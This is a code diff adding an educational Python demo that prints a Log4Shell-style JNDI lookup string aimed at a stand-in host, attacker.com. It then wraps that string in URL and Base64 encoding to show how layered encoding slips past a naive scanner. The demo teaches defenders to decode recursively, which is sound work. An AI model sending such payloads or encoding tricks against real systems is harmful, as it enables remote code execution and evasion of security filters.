@@ -138,3 +138,28 @@ def demo_hex():
     print(f"Input   : {message}")
     print(f"SHA-256 : {sha256_hex}")
     print(f"Length  : {len(sha256_hex)} hex chars = 32 bytes")
+
+# SECTION 5 — OBFUSCATION / ENCODING STACKING RISK
+# ─────────────────────────────────────────────────────────────
+
+def demo_obfuscation_risk():
+    print("\n" + "=" * 60)
+    print("SECTION 5: Encoding-Based Obfuscation (Adversarial Risk)")
+    print("=" * 60)
+
+    # Simulating how attackers stack encoding to bypass filters
+    malicious_payload = "${jndi:ldap://attacker.com/exploit}"  # Log4Shell style
+    print(f"\nOriginal payload  : {malicious_payload}")
+
+    # Layer 1: URL encode
+    layer1 = urllib.parse.quote(malicious_payload)
+    print(f"After URL encode  : {layer1}")
+
+    # Layer 2: Base64 encode on top
+    layer2 = base64.b64encode(layer1.encode()).decode()
+    print(f"After Base64      : {layer2}")
+
+    # Defender's scanner only checks top layer — misses it
+    print(f"\nSimple scanner checks: '{layer2[:30]}...' — NO MATCH for known pattern")
+    print(f"Recursive decode reveals: {urllib.parse.unquote(base64.b64decode(layer2).decode())}")
+    print(f"\nLesson: Security scanners must recursively decode all layers.")
